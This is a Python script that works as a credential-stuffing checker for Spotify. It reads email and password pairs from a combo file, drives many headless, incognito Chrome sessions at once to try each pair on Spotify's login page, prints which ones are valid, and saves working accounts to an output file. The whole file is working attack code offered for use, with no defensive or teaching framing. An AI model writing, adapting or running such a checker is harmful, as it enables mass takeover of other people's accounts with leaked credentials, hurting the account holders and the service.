import os,time,threading,sys,configparser
try:
    import colorama
    from colorama import Fore,Style
    import selenium
    import selenium.webdriver
    import selenium.webdriver.chrome
    from selenium.webdriver.common.by import By
except:
    os.system("pip install -r requirements.txt")

#STATIC CONFIGS **DO NOT MODIFY**
COUNTER = 0
CURRENT_THREADS = 0
colorama.init(autoreset=True)
WARN = False
config = configparser.ConfigParser()
config.read('config.cfg')
HEADLESS = config.getboolean('Settings','HEADLESS')
MAX_THREADS = config.getint('Settings', 'MAX_THREADS')
MAX_THREADS_DELAY = config.getint('Settings', 'MAX_THREADS_DELAY')
ACCOUNT_FILE_NAME = config.get('Settings', 'ACCOUNT_FILE_NAME')
SEPARATED_BY = config.get('Settings', 'SEPARATED_BY')
OUTPUT_FILE = config.get('Settings', 'OUTPUT_FILE')
SHOW_COUNTER = config.getboolean('Settings', 'SHOW_COUNTER')
LOG_LEVEL = config.getint('Settings', 'LOG_LEVEL')

class Program():
    def __init__(self,email,passw,current,account):
        global CURRENT_THREADS
        self.CURRENT_ACCOUNT = account
        self.CURRENT_COUNT = current
        self.login = "https://accounts.spotify.com/login"
        options = selenium.webdriver.ChromeOptions()
        if HEADLESS : options.add_argument("--headless")
        options.add_argument("--disable-gpu")
        options.add_argument("--incognito")
        options.add_argument('--disable-extensions')
        options.add_argument("--test-type")
        options.add_argument('--no-default-browser-check')
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        self.Driver = selenium.webdriver.Chrome(options=options)
        self.Driver.get(self.login)
        try:
            self.username_space = self.Driver.find_element(By.ID,"login-username")
            self.password_space = self.Driver.find_element(By.ID,"login-password")
            self.login_button = self.Driver.find_element(By.ID,"login-button")
        except:
            CURRENT_THREADS -= 1
            return
        self.login = self.Driver.current_url
        self.TryAccount(email,passw)
    def TryAccount(self,email,passw):
        global CURRENT_THREADS
        if LOG_LEVEL == 1:
            print("{0}Checking {1}:{2}...".format(Fore.YELLOW,email,passw))
        self.username_space.send_keys(email)
        self.password_space.send_keys(passw)
        time.sleep(1)
        self.login_button.click()
        time.sleep(1)
        if self.Driver.current_url != self.login:
            if LOG_LEVEL == 1 or LOG_LEVEL == 2: 
                print("{0}VALID! {1}:{2} {3}{4}#{5}".format(Fore.GREEN,email,passw,Style.BRIGHT,Fore.BLUE,self.CURRENT_COUNT if SHOW_COUNTER else ''))
            self.Save(self.CURRENT_ACCOUNT)
        else:
            if LOG_LEVEL == 1 or LOG_LEVEL == 2:
                print("{0}INVALID! {1}:{2} {3}{4}#{5}".format(Fore.RED,email,passw,Style.BRIGHT,Fore.BLUE,self.CURRENT_COUNT if SHOW_COUNTER else ''))
        time.sleep(0.5)
        CURRENT_THREADS -= 1
        self.Driver.close()

    def Save(self,content):
        with open(OUTPUT_FILE,"a") as file:
            file.write("\n"+content)

with open(ACCOUNT_FILE_NAME, "r") as file:
    try:
        accounts = file.readlines()
    except UnicodeDecodeError:
        print(f"{Fore.RED}Can't decode byte in file. Invalid File.")
        sys.exit()

for account in accounts:
    try:
        email, password = account.strip().split(SEPARATED_BY)
    except:
        print(f"{Fore.RED}Invalid organization in this account: "+account)
        continue
    
    while CURRENT_THREADS >= MAX_THREADS:
        time.sleep(MAX_THREADS_DELAY)
        print(f"{Fore.RED}MAX THREADS REACHED.." if not WARN and LOG_LEVEL == 1 else '')
        WARN = True
    
    WARN = False
    COUNTER += 1
    
    thread = threading.Thread(target=Program, args=(email, password,COUNTER,account))
    thread.start()
    CURRENT_THREADS += 1
    continue